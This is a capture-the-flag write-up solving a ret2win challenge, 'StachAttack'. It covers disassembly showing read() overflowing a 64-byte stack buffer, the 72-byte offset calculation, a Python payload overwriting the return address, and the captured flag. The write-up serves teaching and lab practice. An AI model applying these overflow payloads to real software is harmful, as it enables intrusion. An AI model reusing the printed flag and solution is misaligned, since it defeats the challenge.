└─$ python3 script.py | ./stack_attack

# StachAttack

**Category:** Reverse Engineering / Scripting
**Points:** 500
**Description:**

```bash
python3 script.py | ./stack_attack
```

## Solution

### Step 1: Binary Analysis

First, let's examine the binary to understand its properties:

```bash
$ file stack_attack
stack_attack: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
BuildID[sha1]=1d2d5014788c6d6df17ea1fce5920eb0880c4247,
for GNU/Linux 3.2.0, with debug_info, not stripped
```

The binary is:

- 64-bit ELF executable
- Dynamically linked
- **Not stripped** - function names are preserved, making analysis easier

Let's identify the key functions:

```bash
$ nm stack_attack | grep -i win
000000000040123c T win_function
```

The `win_function` is located at address **0x40123c**.

### Step 2: Vulnerability Analysis

Let's examine the vulnerable function using `objdump`:

```asm
00000000004012a7 <vulnerable_function>:
  4012a7:   push   %rbp
  4012a8:   mov    %rsp,%rbp
  4012ab:   sub    $0x40,%rsp          # Allocate 64 bytes (0x40) for buffer
  4012af:   lea    0xd6b(%rip),%rax    # "Enter your payload: "
  4012b6:   mov    %rax,%rdi
  4012b9:   mov    $0x0,%eax
  4012be:   call   401060 <printf@plt>
  4012c3:   mov    0x2d9e(%rip),%rax   # stdout
  4012ca:   mov    %rax,%rdi
  4012cd:   call   401080 <fflush@plt>
  4012d2:   lea    -0x40(%rbp),%rax    # Buffer at RBP-0x40 (64 bytes)
  4012d6:   mov    $0xc8,%edx          # Read up to 200 bytes! (VULNERABILITY)
  4012db:   mov    %rax,%rsi
  4012de:   mov    $0x0,%edi
  4012e3:   call   401070 <read@plt>  # read(0, buffer, 200)
  4012e8:   lea    -0x40(%rbp),%rax
  4012ec:   mov    %rax,%rsi
  4012ef:   lea    0xd40(%rip),%rax    # "Input received: %s"
  4012f6:   mov    %rax,%rdi
  4012f9:   mov    $0x0,%eax
  4012fe:   call   401060 <printf@plt>
  401303:   nop
  401304:   leave
  401305:   ret
```

**The vulnerability:** The buffer is only 64 bytes (0x40), but `read()` accepts up to 200 bytes (0xc8)! This allows us to overflow the buffer and overwrite the return address.

### Step 3: Calculating the Offset

The stack layout when inside `vulnerable_function`:

```
[Buffer: 64 bytes] [Saved RBP: 8 bytes] [Return Address: 8 bytes]
```

To overwrite the return address, we need:

- 64 bytes to fill the buffer
- 8 bytes to overwrite the saved RBP
- **Total offset: 72 bytes**

Then we place our target address (0x40123c).

### Step 4: Examining the Win Function

Let's verify what the win function does:

```asm
000000000040123c <win_function>:
  40123c:   push   %rbp
  40123d:   mov    %rsp,%rbp
  401240:   sub    $0x60,%rsp
  401244:   lea    -0x10(%rbp),%rax
  401248:   mov    %rax,%rdi
  40124b:   call   401196 <process_prt1>    # Process first part
  401250:   lea    -0x18(%rbp),%rax
  401254:   mov    %rax,%rdi
  401257:   call   4011e9 <process_prt2>    # Process second part
  40125c:   lea    -0x10(%rbp),%rdx
  401260:   lea    -0x60(%rbp),%rax
  401264:   mov    %rdx,%rsi
  401267:   mov    %rax,%rdi
  40126a:   call   401040 <strcpy@plt>      # Copy part 1
  40126f:   lea    -0x18(%rbp),%rdx
  401273:   lea    -0x60(%rbp),%rax
  401277:   mov    %rdx,%rsi
  40127a:   mov    %rax,%rdi
  40127d:   call   401090 <strcat@plt>      # Concatenate part 2
  401282:   lea    -0x60(%rbp),%rax
  401286:   mov    %rax,%rsi
  401289:   lea    0xd78(%rip),%rax         # "Access granted! flg: %s"
  401290:   mov    %rax,%rdi
  401293:   mov    $0x0,%eax
  401298:   call   401060 <printf@plt>
  40129d:   mov    $0x0,%edi
  4012a2:   call   4010a0 <exit@plt>
```

The `win_function`:

1. Calls `process_prt1` and `process_prt2` to construct parts of the flag
2. Concatenates them together using `strcpy` and `strcat`
3. Prints the flag with the message "Access granted! flg: %s"
4. Exits

### Step 5: Exploit Development

Now let's write the exploit script:

```python
from struct import pack
import sys

# Offset to return address: 64 (buffer) + 8 (saved RBP) = 72 bytes
offset = 72

# Address of win_function
win_addr = 0x40123c

# Build payload: padding + return address
payload = b"A" * offset + pack("<Q", win_addr)

# Write to stdout (can be piped to the binary)
sys.stdout.buffer.write(payload)
```

**Explanation:**

- `b"A" * offset`: Fill 72 bytes with padding (any value works)
- `pack("<Q", win_addr)`: Pack the address as a 64-bit little-endian value
- Write to stdout so we can pipe it: `python3 script.py | ./stack_attack`

### Step 6: Capturing the Flag

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A' * 64 + b'B' * 8 + b'\x3c\x12\x40\x00\x00\x00\x00\x00')" | ./stack_attack
```

Output:
```
Access granted! flg: CSC26{st4ck_4tt4ck_26}
```

### Flag

```
CSC26{st4ck_4tt4ck_26}
```

